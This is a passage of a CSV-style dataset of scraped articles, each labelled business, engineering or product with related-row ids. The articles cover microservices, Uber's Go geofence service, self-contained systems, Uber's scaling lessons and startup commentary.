that iteration is required for excellence  and the process values prototyping for moving quickly  Ward says the bar is set too low at  usable   Functional shouldn t be an acceptable place to end   To see examples of products moving up the ladder and to learn how you can move your products up the ladder  I encourage you to watch the video above  Or check out all of our other DesignTalks below,"[714 344 300 234 61 1090 1235 606 1409 683 1335]"
722,training-dataset/business/158.txt,business,YouTubeWe were unable to complete the request  please try again later,"[722 1096 683 1422 1101 576 1351 206 310 1117 92]"
727,training-dataset/engineering/374.txt,engineering,SCS  Self Contained SystemsSelf Contained Systems Assembling Software from Independent Systems  Introduction  The Self contained System  SCS  approach is an architecture that focuses on a separation of the functionality into many independent systems  making the complete logical system a collaboration of many smaller software systems  This avoids the problem of large monoliths that grow constantly and eventually become unmaintainable  Over the past few years  we have seen its benefits in many mid sized and large scale projects   The idea is to break a large system apart into several smaller self contained systems  or SCSs  that follow certain rules   SCS Characteristics,"[727 278 889 935 520 596 92 582 61 1373 713]"
731,training-dataset/product/1076.txt,product,Page Not FoundProduct Management   the intersection of Business  Technology and the User,"[731 737 298 809 278 1192 61 875 344 1408 300]"
733,training-dataset/engineering/219.txt,engineering,How We Built Uber Engineering s Highest Query per Second Service Using Goby Kai Wei  In early 2015 we built a microservice that does one thing  and does it really well   geofence lookups  One year later  this service is Uber s highest queries per second  QPS  service out of the hundreds we run in production  Here s the story of why we built this service  and how the relatively recent Go programming language helped us build and scale it so fast   Background  At Uber  a geofence refers to a human defined geographic area  or polygon in geometry terms  on the Earth s surface  We use geofences extensively at Uber for geo based configurations  This is important for showing users which products are available at a given location  defining areas with specific requirements such as airports  and implementing dynamic pricing in neighborhoods where lots of people are requesting rides at the same time   An example geofence in Colorado   The first step to retrieve geolocation based configurations for something like a lat lon pair from a user s mobile phone is to find which geofences the location falls into  This functionality used to be scattered and duplicated in multiple services modules  But as we move away from a monolithic architecture to a  micro service oriented architecture  we chose to centralize this functionality into a single new microservice   Ready  Set  Go   Node js was the real time marketplace team s primary programming language at the time we evaluated languages  and thus we had more in house knowledge and experience with it  However  Go met our needs for the following reasons   High throughput and low latency requirements   Geofence lookups are required on every request from Uber s mobile apps and must quickly  99th percentile   100 milliseconds  answer a high rate  hundreds of thousands per second  of queries   CPU intensive workload   Geofence lookups require CPU intensive point in polygon algorithms  While Node js works great for our other services that are I O intensive  it s not optimal in this use case due to Node s interpreted and dynamic typed nature   Non disruptive background loading   To ensure we have the freshest geofences data to perform the lookups  this service must keep refreshing the in memory geofences data from multiple data sources in the background  Because Node js is single threaded   background refreshing can tie up the CPU for an extended period of time  e g   for CPU intensive JSON parsing work   causing a spike in query response times  This isn t a problem for Go  since goroutines can execute on multiple CPU cores and run background jobs in parallel with foreground queries   To Geo Index or Not  That is the Question  Given a location specified as a lat lon pair  how do we find which of our many tens of thousands of geofences this location falls into  The brute force way is simple  go through all the geofences and do a point in poly check using an algorithm  like the ray casting algorithm  But this approach is too slow  So how do we narrow down the search space efficiently   Instead of indexing the geofences using R tree or the complicated S2  we chose a simpler route based on the observation that Uber s business model is city centric  the business rules and the geofences used to define them are typically associated with a city  This allows us to organize the geofences into a two level hierarchy where the first level is the city geofences  geofences defining city boundaries   and the second level is the geofences within each city   For each lookup  we first find the desired city with a linear scan of all the city geofences  and then find the containing geofences within that city with another linear scan  While the runtime complexity of the solution remains O N   this simple technique reduced N from the order of 10 000s to the order of 100s   Architecture  We wanted this service to be stateless so every request could go to any instance of the service and expect the same result  This means each service instance must have knowledge of the entire world as opposed to using partitioning  We generated a deterministic polling schedule so the geofences data from different service instances is kept in sync  Thus  this service has a very simple architecture  Background jobs periodically poll geofences data from various datastores  In turn  this data is saved in main memory to serve queries and serialized to the local file system for fast bootstrap on service restarts   Our service architecture for geofence lookups   Dealing with the Go Memory Model  Our architecture requires concurrent read write access to our in memory geo index  In particular  the background polling jobs write to the index while the foreground query engine reads from the index  For people coming from the single threaded Node js world  the Go memory model could present a challenge  While the idiomatic Go way is to synchronize concurrent read write with goroutines and channels  we were concerned about the negative performance implications  We tried to manage the memory barriers ourselves using the StorePointer LoadPointer primitives from the sync atomic package  but that led to brittle and hard to maintain code   Eventually  we settled on the middle ground  using a read write lock to synchronize access to the geo index  To minimize the lock contention  new index segments were built on the side before being atomically swapped into the main index for serving queries  This use of locks resulted in slightly increased query latency compared to the StorePointer LoadPointer approach  but we believe the gain in simplicity and maintainability of the codebase was well worth the small performance cost   Our Experience  Looking back  we are extremely happy with our decision to Go for it and write our service in a new language  The highlights   High developer productivity   Go typically takes just a few days for a C    Java or Node js developer to learn  and the code is easy to maintain   Thanks to static typing   no more guessing and unpleasant surprises    High performance in throughput and latency   In our main data center serving non China traffic alone  this service handled a peak load of 170k QPS with 40 machines running at 35  CPU usage on NYE 2015  The response time was   5 ms at 95th percentile  and   50 ms at the 99th percentile   Super reliable   This service has had 99 99  uptime since inception  The only downtime was caused by beginner programming errors and a file descriptor leak bug in a third party library  Importantly  we haven t seen any issues with Go s runtime   Where Do We Go From Here   While historically Uber has been mostly a Node js and Python shop  the Go language is becoming the language of choice for building many of Uber Engineering s new services  There is a lot of momentum behind Go at Uber  so if you re passionate about Go as an expert or a beginner  we are hiring Go developers  Oh  the places you ll Go   Photo Credit   Golden Gate Gopher  by Conor Myhrvold  Golden Gate Park  San Francisco   Header Explanation  The Go gopher is described as  an iconic mascot and one of the most distinctive features of the Go project    Like what you re reading  Sign up for our newsletter for updates from the Uber Engineering blog,"[733 673 1300 1351 952 778 281 1295 1016 1086 500]"
735,training-dataset/engineering/764.txt,engineering,The Four Layers of Microservice Architecture   Susan J  FowlerLayer 1  The Hardware Layer  At the very bottom of the microservice ecosystem lies the hardware layer  which is comprised of the actual machines that run everything in the layers above  These machines can be your own machines in your own datacenters or they can be  virtual machines running on  machines owned by cloud providers  like AWS s EC2  GCP  or Azure   In this layer we also find databases   both dedicated databases and shared databases  We also find the operating system  which in microservice architecture is usually some variant of Linux  like Debian or Ubuntu  On top of the machines and the operating systems we find all of the resource isolation and abstraction systems  like Docker and Mesos  On top of that  we have host level monitoring as well as host level logging  which is monitoring and logging that is done on these machines in the hardware layer  here  host  refers to the machine or virtual machine   Lastly we have configuration management tools  like Puppet or Ansible   which make sure that every host has the right applications running on it and the correct configurations installed   Layer 2  The Communication Layer  On top of the hardware layer we find the communication layer  This layer is special and is sort of confusing  because it touches every other layer in the ecosystem  It s the layer that contains everything related to communication between applications  systems  and services  Here we find the network and DNS  This layer also contains any remote procedure calls  RPCs  or messaging that is used for communication between the microservices  All of the microservices  API endpoints can also be thought as being part of the communication layer  because in order for the microservices to communicate with one another  they need to both communicate over using the same protocol  e g   HTTP  and send data in the same format  e g   JSON   Traffic routing and distribution also belongs in this layer  which means that the communication layer also contains service discovery  service registry  and load balancing   Layer 3  The Application Platform  Layer 3 of the microservice ecosystem is where all of the internal tools and systems and services and platforms that the microservices run on live  All of the things in this layer are built to be centralized  system wide tools and services that the microservice developers can use  A good application platform is one that enables microservice development teams to only have to think about the microservice s  they are working on  not anything below it  This layer contains good self service internal development tools  which will be specific to the company s needs  It will also contain a standardized development process  which comes with  at the very least  a good version control system  a good collaboration tool  like github or phabricator   and a stable development environment  You ll also find all of the  hopefully automated  test  build  package  and release tooling in this layer  The deployment pipeline   the way which new code is deployed to servers   is also here  Finally  all microservice level logging and monitoring can also be found in the application platform layer  the reason it s here and not in Layer 4 is that  in microservice architecture  logging and monitoring should be centralized and standardized  independent of the individual microservices    Layer 4  The Microservice Layer  At the very top of the ecosystem is the microservice layer  This layer has all of the microservices  and everything specific to them  like configurations   This layer is almost completely independent of the layers below  and this is the only layer that almost all microservice development teams work with and interact with   everything else is abstracted away and lives in the layers below   Summary of the Four Layers of Microservice Architecture  To summarize  here are the four layers of the microservice ecosystem and all of the things that they contain   Layer 1  The Hardware Layer  Configuration management tools  Databases  Servers  Host level logging and monitoring  Operating Systems  Resource isolation  Resource abstraction  Layer 2  The Communication Layer  DNS  Endpoints  Load balancing  Messaging  Network  Remote procedure calls  Service discovery  Service registry  Layer 3  The Application Platform  Deployment pipeline  pipeline Development environment  Microservice level logging and monitoring  Self service internal development tools  Test  package  build  and release tools  Layer 4  The Microservice Layer  All microservice specific configurations  The microservices  Want to know more  I wrote a whole book about this stuff  It s called Production Ready Microservices  Check it out,"[735 773 1351 952 60 548 1126 1377 92 278 1405]"
737,training-dataset/product/1330.txt,product,The product Is   Is not   Does   Does notThis page is an activity of The Lean Inception  for an overview go to the main page   For more details on how to run a workshop  consult the book,"[737 1042 890 298 731 85 1101 902 613 541 606]"
757,training-dataset/business/817.txt,business,Sam AltmanI recently got to be a guest at a FarmLogs board meeting  I was struck by how much of an impact the company was having on the world  and how just a couple of years ago it seemed like they were doing something so small   FarmLogs is a great example of a company that started out with a seemingly boring idea  a way for farmers to store their data in the cloud  and has developed into a way for farmers to run their entire farm  gather all the data about a particular piece of farmland  and optimize production  The company is now used by 20  of US row crop farms  and those farms are all more productive than they were without the software   Eventually  FarmLogs can become the operating system for efficient  semi autonomous farms   Technology is about doing more with less  This is important in a lot of areas  but few as important as natural resources   We need technology like this to meet the resource challenges that the planet will continue to face as the population grows and standards of living continue to increase  In fact  we need another hundred companies like this   The good news is that it s doable  FarmLogs is only three years old  YC Winter 2012   The company has used less than  3 million of capital so far  and with it they have already helped farmers gain hundreds of millions of dollars in efficiency  The software revolution is making it possible to create world changing companies relatively quickly and with relatively modest resources   And importantly  they started out doing something that any two programmers  with domain expertise in their market  could have done,"[757 1373 1403 61 935 809 1336 1192 92 1225 778]"
773,training-dataset/business/1075.txt,business,Microservices Essentials for Executives  The Key to High Velocity Software Development Software is eating the world    Marc Andreesen  Companies thriving in the new world order have technology as a core competency  They build complex cloud applications  They constantly bring new capabilities and features to the market  And despite the constant iteration and updates to their cloud application  their software is rock solid reliable  How do they achieve such agility and reliability   Over the past few years  Amazon  Uber  Airbnb  Netflix  Yelp  and many other industry disruptors adopted a new paradigm for developing cloud applications   microservices  The velocity that microservices is giving these disrupters is even raising software architecture to board agendas   Whether the term microservices is vaguely familiar or something you haven t encountered yet  this article will cover what it is  why it matters  and what will change in your company when you adopt it   What are microservices   Traditionally  cloud applications were built as a single large application  popularly known as the monolith   Some describe microservices as a splintering of monolithic software applications into smaller pieces  That is a true but incomplete explanation that misses the essential benefit of microservices   each of your development teams can work on an independently shippable unit of code  called a microservice  It is better to describe microservices as  an architecture for the distributed development of cloud applications    For example  the original Amazon com was a monolithic application  consisting of millions of lines of C    Over time  Amazon has split the functionality of that single application into smaller services  so there is a separate service for recommendations  for payment  for search  and so forth  In turn  each of these separate services may consist of dozens of smaller microservices   In the original Amazon architecture  a bug fix to the recommendation service would require changing some C   in the monolithic application  waiting for other groups to complete their respective changes to the monolithic application  and testing the entire application for release  In the microservices architecture  the recommendation development team can make changes to their microservice   and release it without waiting to coordinate with the other feature teams   Yelp has also adopted a microservices architecture  consisting of hundreds of services  Just loading the Yelp homepage invokes dozens of microservices  as shown in the example below   Why microservices   There are six major benefits to microservices   Increased agility  Microservices empower development organizations to respond much more quickly to market and customer feedback  Whether it s a game changing feature or a tweak to make an existing feature eminently more usable  no longer will its release be delayed by the schedule of the single release train  Instead  each microservice can be released independently  Organizational scale  With a monolith  the risk of breaking each other s code rises dramatically with each additional developer  This slows development  as additional testing  debugging  and integration is required to prevent inadvertent errors  In a microservices architecture  each team works on an independent code base  so bugs are isolated to a single microservice  Development efficiency  Monolith development teams are constrained to a common technology stack and process  Microservices architecture enables independent teams to choose the right processes and technology for a given service  For example  the PCI standard requires that any code base that handles credit card data be subject to compliance audits  With payment processing handled by a single or a set of microservices  the amount of code that is in scope is substantially reduced  Or a recommendation engine might be written in Python to use the TensorFlow machine learning library  while other services are written in Java  Cost efficient scaling  In a traditional monolith  the entire application must be scaled when it reaches its limits  For example  if the application is not performing  new servers must be added that are capable of running additional instances of the monolith  In a microservices architecture  each microservice can be individually scaled  Thus  new servers are only added for a given microservice that is a bottleneck  This more granular approach to scaling enables a more cost efficient compute model  Faster onboarding  With microservices  new engineers can safely start coding on a small microservice  There s no need for an engineer to learn a monolithic code base just to fix a bug  Attract more talented engineers  Microservices enables you to incrementally adopt and test new technologies   and good engineers want to work with the latest technology   Microservices are not for everyone  While there are many benefits to microservices  microservices is not a fit for everyone  In particular  organizations with small engineering teams should consider a monolith first approach  In these organizations  the development team does not have the capacity to independently iterate on multiple features at the same time  Adopting a monolith first  and adding microservices as the team grows  is typically a better strategy   The impacts of adopting a microservices architecture  Adopting a microservices architecture yields significant benefits  but also drives considerable changes  There are three types of changes to anticipate  culture  deployment infrastructure  and developer infrastructure   Teams gain greater autonomy  Perhaps the biggest change in adopting microservices is cultural  In order to increase agility and efficiency  microservices development teams make decisions that were previously out of their control  such as ship dates  Many organizations also empower teams to customize their QA strategy or technology stack   This reallocation of decision making authority requires changes in people and education  Handing off more responsibilities for ship date decisions as well as technology and process selection to teams requires at least one team member capable of making these decisions or some up front investment in training and mentoring to develop these skills   This is not to say that technology stack standards or architectural review boards will disappear and chaos reign  But flexibility in technology and processes will increase and the review process will be more open to team needs   The role of VP of Engineering will also evolve significantly  They will orchestrate the cultural change along with changes in job descriptions and training  They will evaluate and implement the tools and infrastructure described below  And they will revamp metrics  Engineering throughput will no longer be measured by story points per sprint but also by speed at which new and updated features are deployed  Application reliability will no longer be measured simply by Mean Time Between Failure but also by Mean Time To Recover for microservices   Deployment infrastructure becomes fully automated  At scale  a cloud application may have hundreds of individual microservices  each of which may consist of multiple instances  for availability and scalability   Moreover  these microservices will be independently updated by their respective development teams  The ballooning number of moving parts and frequency of updates quickly require a fully automated deployment workflow and infrastructure is essential   While there are many technology choices to fully automate deployment workflow  there are a few common capabilities in the deployment infrastructure that we ve observed in all successful adopters of microservices   Full automation from code to customer  Typically  once a developer commits code to a source repository  there is a push button process that automatically takes the latest source code  builds it  packages it into a deployment artifact such as a container or AMI  and then deploys the entire artifact into staging or production  This is often referred to as Continuous Delivery   Elastic scaling  Microservices by nature are fairly ephemeral   new versions get deployed  old versions are retired  and new instances are added or removed based on utilization  A deployment infrastructure such as Amazon s Elastic Compute Cloud  Docker Datacenter  or Kubernetes that supports elastic scaling is essential to support these use cases   While many other capabilities can be added to deployment infrastructure such as automated regression testing  we ve seen organizations successfully adopt microservices by investing in automation and elastic scaling   Developer infrastructure for the microservices network  The last challenge in adopting microservices is perhaps the most poorly understood aspect of microservices  If a monolithic application resembles a house with different features in separate rooms  a microservices application is more like a neighborhood of houses each hosting a microservice  Communication in the microservices neighborhood requires a different paradigm  Like houses speaking by phone  instead of yelling downstairs   microservices communicate over a network  This requires a set of common services and enabling technology  These tools and technologies are used by developers who are coding microservices  and are distinct from the deployment infrastructure used by DevOps engineers    For a deeper discussion of the developer infrastructure needed to support microservices  please see the end of this article   Eat or be eaten  Given that the benefits of microservices require new investment and trigger changes  you may ask  as a VP Engineering was recently asked  Why are you doing microservices   He replied   Because if we don t do it  we will die from the competition moving faster    There is incredible momentum in adopting microservices because of the benefits around agility  efficiency  onboarding  and recruiting  Dozens of companies are investing in the training  tools  and infrastructure to simplify the adoption of microservices  The number of developers who have experience in adopting microservices is growing  The effort to adopt microservices is rapidly shrinking  and will continue to go down over time   If you re interested in learning more about how to adopt microservices  the Virtual Microservices Practitioner Summit featuring real world microservices practitioners is on July 13  Videos from the first Microservices Practitioner Summit featuring Netflix  Uber  and others are also online at microservices com    More about developer infrastructure  The basic use case for developer infrastructure is to provide a common protocol so that all microservices can connect to each other  Libraries that support these protocols need to be available in every technology stack used by an organization  HTTP is popular choice of protocol in monolithic architectures  but the synchronous nature of HTTP erodes reliability as you add more microservices to your network   Microservices connected together using HTTP are analogous to Christmas tree lights wired serially  If one light bulb goes out  your entire strand no longer lights  More sophisticated protocols offer the ability to wire your services in parallel    In addition  in a microservices architecture a typical service request spans multiple microservices  For example  the process of loading all the tweets in your Twitter feed invokes advertising related microservices  microservices that display a tweet  including adding hashtag links and images   and microservices that display tweets from the people you follow  Specialized tools designed to trace errors and performance to a specific microservice in this scenario are important to ensure developer productivity   There are two fundamental capabilities required of microservices developer infrastructure   Enable loosely coupled services  Services need well defined protocols to communicate  and dependencies need to be contained within each microservice  Ben Christensen  one of the architects of the Netflix microservices architecture  speaks about this challenge in his talk Don t Build A Distributed Monolith  Loosely coupled services let you update the code for a single microservice without affecting any other services that depend on it  Your developer infrastructure needs to provide implementations of these protocols across all your microservices   Application resiliency  When a microservice is unavailable for whatever reason   software bug  network outage  machine failure   the entire cloud application must continue to function and recover gracefully with minimal human intervention  Techniques for service availability  e g   load balancing   service isolation  e g   circuit breakers   and service recovery  e g   rollback  are an essential part of the developer toolkit   Richard Li is the co founder and CEO of Datawire  a company building open source infrastructure and tools for microservices,"[773 60 1126 278 548 1377 695 234 1159 935 1405]"
778,training-dataset/engineering/1053.txt,engineering,Lessons Learned from Scaling Uber to 2000 Engineers  1000 Services  and 8000 Git repositoriesWednesday  October 12  2016 at 8 56AM  For a visual of the growth Uber is experiencing take a look at the first few seconds of the above video  It will start in the right place  It s from an amazing talk given by Matt Ranney  Chief Systems Architect at Uber and Co founder of Voxer  What I Wish I Had Known Before Scaling Uber to 1000 Services  slides    It shows a ceaseless  rhythmic  undulating traffic grid of growth occurring in a few Chinese cities  This same pattern of explosive growth is happening in cities all over the world  In fact  Uber is now in 400 cities and 70 countries  They have over 6000 employees  2000 of whom are engineers  Only a year and half a go there were just 200 engineers  Those engineers have produced over 1000 microservices which are stored in over 8000 git repositories   That s crazy 10x growth in a crazy short period of time  Who has experienced that  Not many  And as you might expect that sort of unique  compressed  fast paced  high stakes experience has to teach you something new  something deeper than you understood before   Matt is not new to this game  He was co founder of Voxer  which experienced its own rapid growth  but this is different  You can tell while watching the video Matt is trying to come to terms with what they ve accomplished   Matt is a thoughtful guy and that comes through  In a recent interview he says   And a lot of architecture talks at QCon and other events left me feeling inadequate  like other people  like Google for example   had it all figured out but not me   This talk is Matt stepping outside of the maelstrom for a bit  trying to make sense of an experience  trying to figure it all out  And he succeeds  Wildly   It s part wisdom talk and part confessional   Lots of mistakes have been made along the way   Matt says  and those are where the lessons come from   The scaffolding of the talk hangs on WIWIK  What I Wish I Had Known  device  which has become something of an Internet meme  It s advice he would give his naive  one and half year younger self  though of course  like all of us  he certainly would not listen   And he would not be alone  Lots of people have been critical of Uber  HackerNews  Reddit   After all  those numbers are really crazy  Two thousand engineers  Eight thousand repositories  One thousand services  Something must be seriously wrong  isn t it   Maybe  Matt is surprisingly non judgemental about the whole thing  His mode of inquiry is more questioning and searching than finding absolutes  He himself seems bemused over the number of repositories  but he gives the pros and cons of more repositories versus having fewer repositories  without saying which is better  because given Uber s circumstances  how do you define better   Uber is engaged in a pitched world wide battle to build a planetary scale system capable of capturing a winner takes all market  That s the business model  Be the last service standing  What does better mean in that context   Winner takes all means you have to grow fast  You could go slow and appear more ordered  but if you go too slow you ll lose  So you balance on the edge of chaos and dip your toes  or perhaps your whole body  into chaos  because that s how you ll scale to become the dominant world wide service  This isn t a slow growth path  This a knock the gate down and take everything strategy  Think you could do better  Really   Microservices are a perfect fit for what Uber is trying to accomplish  Plug your ears  but it s a Conway s Law thing  you get so many services because that s the only way so many people can be hired and become productive   There s no technical reason for so many services  There s no technical reason for so many repositories  This is all about people  mranney sums it up nicely   Scaling the traffic is not the issue  Scaling the team and the product feature release rate is the primary driver   A consistent theme of the talk is this or that is great  but there are tradeoffs  often surprising tradeoffs that you really only experience at scale  Which leads to two of the biggest ideas I took from the talk   Microservices are a way of replacing human communication with API coordination   Rather than people talking and dealing with team politics it s easier for teams to simply write new code  It reminds me of a book I read long ago  don t remember the name  where people lived inside a Dyson Sphere and because there was so much space and so much free energy available within the sphere that when any group had a conflict with another group they could just splinter off and settle into a new part of the sphere  Is this better  I don t know  but it does let a lot of work get done in parallel while avoiding lots of people overhead     Rather than people talking and dealing with team politics it s easier for teams to simply write new code  It reminds me of a book I read long ago  don t remember the name  where people lived inside a Dyson Sphere and because there was so much space and so much free energy available within the sphere that when any group had a conflict with another group they could just splinter off and settle into a new part of the sphere  Is this better  I don t know  but it does let a lot of work get done in parallel while avoiding lots of people overhead  Pure carrots  no sticks  This is a deep point about the role of command and control is such a large diverse group  You ll be tempted to mandate policy  Thou shalt log this way  for example  If you don t there will be consequences  That s the stick  Matt says don t do that  Use carrots instead  Any time the sticks come out it s bad  So no mandates  The way you want to handle it is provide tools that are so obvious and easy to use that people wouldn t do it any other way   This is one of those talks you have to really watch to understand because a lot is being communicated along dimensions other than text  Though of course I still encourage you to read my gloss of the talk      Stats  April 2016   Uber is in 400 cities worldwide   70 countries   6000  employees  2000 engineers  a year and half ago there were 200   1000 services  number is approximate  Number of different services changes so rapidly it s hard to get an accurate count of the actual number of services in production  Lots of teams are building lots of things  Don t even care about the actual number   Over 8000 repos in git   Microservices  It s great to break up all your monoliths into smaller things  Even the name monolith sounds bad  But microservices have their bad side   The time when things are most likely to break is when you change them  Uber is most reliable on the weekends when engineers aren t making changes even though that s when Uber is the busiest   Everytime you go to change something you risk breaking it  Does it make sense at some point to never touch a microservice  Maybe   The Good It s worth questioning  why are we throwing so much effort into microservices  It s not by accident  there are a lot of good results  Microservices allow teams to be formed quickly and run independently  People are being added all the time  Teams need to be formed quickly and put to work on something where they can reason about the boundaries  Own your own uptime  You run the code that you write  All the service teams are on call for the services they run in production  Use the best tool for the job  But best in what way  Best to write  Best to run  Best because I know it  Best because there are libraries  When you dig into it  best doesn t mean a lot   The Obvious Costs What are the costs of running a big Microservices deployment  Now you are running a distributed system  which is way harder to work with than a monolith  Everything is an RPC  You have to handle all these crazy failure modes  What if breaks  How do you troubleshoot  How do you you figure out where in the chain of services the break occurred  How do make sure the right people get paged  The right corrective actions are taken fix the problem  These are still all the obvious costs   The Less Obvious Costs Everything is a tradeoff  even if you don t realize you are making it  In exchange for all these microservices you get something  but you give up something too  By super modularizing everything we introduce some subtle and non obvious problems  You might choose to build a new service instead of fix something that s broken  At some point the cost of always building around problems and cleaning up old problems starts to be a factor  You find yourself trading complexity for politics   Instead of having awkward conversations  laden with human emotions  you can just write more software and avoid talking  You get to keep your biases   If you like Python and the team you are interfacing with likes node and instead of working in another code base you can just build new stuff in your own preferred language  You get to keep doing what you think is best even though that might not be the best thing for the organization or the system as a whole     The Cost of Having Lots of Languages  Prehistory  At first Uber was 100  outsourced  It didn t seem like a technology problem so some company wrote the first version of the mobile app and the backend   Dispatch  When development was brought in house it was written in Node js and is now moving to Go   Core Service  the rest of the system  was originally written in Python and is now moving to Go   Maps was eventually brought in house and those teams are using Python and Java   The Data Engineering team writes their code in Python and Java   The in house Metric system is written in Go   You start to notice that s a lot of languages  Microservices allow you to use lots of languages   Teams can write in different languages and still communicated with each other  It works  but there are costs  Hard to share code  Hard to move between teams  Knowledge built up on one platform doesn t transfer to another platform  Anyone can learn of course  but there s a switching cost   What I Wish I Knew  having multiple languages can fragment culture  By embracing the microservices everywhere you can end up with camps  There s a node camp  a Go camp  etc  It s natural  people organize around tribes  but there s a cost to embracing the strategy of having lots of languages everywhere   The Cost of RPC  Teams communicate with each other using RPCs   At scale with lots and lots of people joining really quickly the weaknesses of HTTP start to show up  Like what are status codes for  What are headers for  What goes in the query string  Is this RESTful  What method is it   All these things that seem really cool when doing browser programming  but become very complicated when doing server programming   What you really want to say is run this function over there and tell me what happened  Instead  with HTTP REST you get all these subtle interpretation issues  all this is surprisingly expensive   JSON is great  you can look at it with your eyeballs and read it  but without types it s a crazy mess  but not right away  the problems pop up later  When someone changes something and a couple of hops downstream they were depending on some subtle interpretation of empty string versus null  or some type coercion in one language versus another  it would cause a huge mess that would take forever to sort out  Types on interfaces would have fixed all these of the problems   RPCs are slower than procedure calls   What I Wish I Knew   servers are not browsers  When talking across a datacenter it makes a lot more sense to treat everything like a function call rather than a web request  When you control both sides of a conversation you don t need all the extra browsery stuff     Repositories  How many repos are best  He thought one was best  but many disagreed   Many people think many repos is best  Maybe one per project or even multiple per project   Having many repos follows the industry trend of having many small modules  Small modules are easy to open source or swap out   One repo is great because you can make cross cutting changes  It you want to make a change it s easy to hit all the code that needs to be changed  It s also easy to browse the code   Many is bad because it s going to stress out your build system  It hurts your ability to navigate the code  It s painful to make sure cross cutting changes are done correctly   One is bad because it s going to get so big you won t be able to build or even checkout your software unless you have some crazy elaborate system on top  One repo is probably not usable without special tooling  Google has one repo but it uses a virtual file system to make it seem like you have the whole repo checked out   Over 8000 repos in git  One month ago there were 7000  Some individuals have their own repos  Some teams track service configuration separately from the service itself using a separate repo  But the majority are production repos   That s a lot repos   Operational Issues  What happens when things break  There are some surprising issues that come up with a large microservices deployment   If other teams are blocked on your service and that service isn t ready to be released  is it OK for the other teams to put a fix into your service and release it  Is owning your own uptime compatible with other teams releasing your service  even if all your tests pass  Is the automation good enough that teams can release each other s software  At Uber it depends on the situation  Sometimes yes  but usually the answer is no  teams will just have to blocked on the fix   Great  small teams  everyone is moving fast  all releasing features super quickly  but sometimes you have to understand the whole system as one thing connected together as one giant machine  That s hard when you ve spent all this time breaking it up into microservices  This is a tricky problem  Wishes more time was spent keeping that context together  Should still be able to understand the whole system working as one     Performance Issues  Performance is definitely going to come up given how dependent microservices are on one another   RPCs expensive  and especially when there are multiple languages the answer for how you understand your performance totally depends on the language tools and the tools are all different   You ve let everyone program in their own language now understanding performance across those languages is a real challenge   Trying to have all languages have a common profiling format using Flame Graphs   As you want to understand the performance of the system a big point of friction when trying to chase down a performance problem is how different the tools are   Everyone wants a dashboard  but if the dashboards aren t generated automatically teams will just put on dashboards what they think is important so when you want to chase a problem down one team s dashboard will look completely different from another   Every service when created should have a standard dashboard with the same set of useful data  Should be able to create a dashboard with no work at all  Then you can browse other team s services and it will all look the same   What I Wish I Knew   Good performance is not required but you need to know where you stand  A big debate is if you should even care about performance  The  premature optimization is the root of all evil  type thinking has spawned a very weird subculture of people who are against optimization  It doesn t matter  services aren t that busy  We should always optimize for developer velocity  Buying computers is cheaper than hiring engineers  A certain truth to this  Engineers are very expensive  The problem is performance doesn t matter until it does  One day you will have a performance problem and if a culture of performance doesn t matter has been established it can be very difficult to have performance suddenly matter  You want to have some sort of SLA that s performance based on everything that gets created just so there is a number     Fanout Issues   Tracing  Fanout causes a lot of performance problems   Imagine a typical service that 99  of the time responds in 1ms  1  of the time it responds in one second  Still not so bad  1  of the time users will get the slow case   Now let s say services start having a big fanout  calling lots of other services  The chance of experiencing slow response times goes up quickly  Use 100 services and 63  of response time ar at least 1 second  1 0    99 100   63 4     Distributing tracing is how you track down fanout problems  Without a way to understand a requests journey through the architecture it will be difficult to track down fanout problems  Uber is using OpenTracing and Zipkin  Another approach is to use logs  Each log entry has a common ID that threads all the services together   Example is given of a tricky case  The top level had a massive fanout all to the same service  When you look at the service it looks good  Every request is fast and is consistent  The problem was the top level service got a list of ID and was calling the service for each ID  Even concurrently that will take too long  Just use a batch command  Without tracing it would have been very hard to find this problem   Another example is a service that made many thousands of service calls  Though each call was fast the large number of them made the service slow  It turns out when traversing a list and changing a property it magically turned into a database request  Yet the database team says the database is working great because each operation is fast  but they will wonder why there are so many operations   The overhead of tracing can change the results  Tracing is a lot of work  One option is to not trace all requests  Trace a statistically significant portion of the requests  Uber traces about 1  of requests   What I Wish I Knew   Tracing requires cross language context propagation  Because all these different languages are used with all these different frameworks  getting context about the request  like what user it is  are they authenticated  what geo fence are they in  that becomes very complicated if there s no place to put this context that will get propagated  Any dependent requests a service makes must propagate context even though they may not understand it  This feature would have saved so much time if it had been added a long time ago     Logging  With a bunch of different languages and bunch of teams and lots of new people  half the engineering team has been around for less than 6 months  everyone might tend to log in very different ways   Mandate is a tricky word  but that s what you really want to do  mandate a common logging approach  The more acceptable way to say it is provide tools that are so obvious and easy to use that people wouldn t do any other way in order to get consistent and structured logging   Multiple languages makes logging hard   When there are problems logging itself can make those problems worse by logging too much  Need backpressure in the log to drop log entries when overload  Wish that had been put in the system earlier   What I Wish I Knew   some notion of accounting for log message size so it can be traced who is producing too much log data  What happens to the all logs is they get indexed by some tool so people can search through them and learn things  The amount of data that gets logged  if logging is free  is quite variable  Some people will log a lot and overwhelm the system with data  With an accounting system when log data is sent to the cluster for indexing a bill could be sent to the service to pay for it  The idea is to put pressure back on developers to log smarter  not harder  Uber created uber go zap for structured logging     Load Testing  Want to load test before putting a service in production but there s no way to build as big a test environment as the production environment   Also a problem generating realistic test data to test all parts of the system   Solution  run tests on production during off peak hours   Causes lots of problems   It blows up all the metrics  You don t want people to think there s more load than there really is  To fix the problem it gets back to the context propagation problem  Make sure all test traffic requests have some context that says this a test request so handle your metrics differently  That has to plumb all the way through the system   What I Wish I Knew   what we really want to do is run load through all the services all the time because a lot of bugs only show up when traffic hits its peak  Want to keep systems near their peaks and the back off as real traffic increases  Wishes the system was long ago built to handle test traffic and account for it differently     Failure Testing  What I Wish I Knew   Not everybody likes failure testing  like Chaos Monkey  especially if you have to add it in later  What we should have done is made failure testing happen to you if you liked it or not  It s just part of production  Your service just has to withstand random killings and slowings and perturbations of operations     Migrations  All our stuff is legacy  It s all migrations  Mostly people who work on storage all they are doing is migrations from one piece of legacy to another not quite so legacy thing   Someone is always migrating something somewhere  That s what everyone is doing no matter what people tell you at conferences   Old stuff has to be kept working  The business still has to run  There s no such thing as a maintenance window any more  There s acceptable downtime   As you become a global business there are no off peak times  It s always peak time somewhere   What I Wish I Knew   mandates to migrate are bad  Nobody wants to be told they have to adopt some new system  Making someone change because the organization needs to change versus offering a new system that is so much better that it will be obvious that you need to get on this new thing  Pure carrots no sticks  Anytime the sticks come out it s bad  unless it s security or compliance related  then it s probably OK to force people to do stuff     Open Source  Nobody agrees on the build buy tradeoff  When should you build  When should you buy   Anything that s part of the infrastructure  anything that seems like it s part of the platform and not part of the product  at some point it s on its way to 